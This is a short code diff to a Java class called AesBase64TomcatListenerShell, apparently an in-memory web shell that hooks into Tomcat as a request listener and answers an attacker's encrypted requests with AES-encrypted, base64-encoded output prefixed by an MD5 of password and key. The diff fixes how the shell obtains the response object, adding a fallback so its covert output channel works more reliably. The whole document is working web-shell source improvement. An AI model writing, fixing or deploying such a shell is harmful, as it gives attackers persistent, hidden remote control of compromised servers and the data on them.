@@ -481,6 +481,11 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
     private void run(Object servletRequestEvent) {
         try {
             Object request = invokeMethod(servletRequestEvent, "getServletRequest");
+            Object response = getFieldValue(getFieldValue(request, "request"), "response");
+            
+            if (response == null) {
+                response = getFieldValue(request, "response");
+            }
 
             try {
                 String contentType = getContentType(request);
@@ -506,7 +511,6 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                                 f.toString();
                                 String md5 = md5(password + key);
                                 if (arrOut.size() > 0) {
-                                    Object response = getFieldValue(getFieldValue(request, "request"), "response");
                                     PrintWriter printWriter = (PrintWriter) invokeMethod(response, "getWriter");
                                     printWriter.write(md5.substring(0, 16));
                                     printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
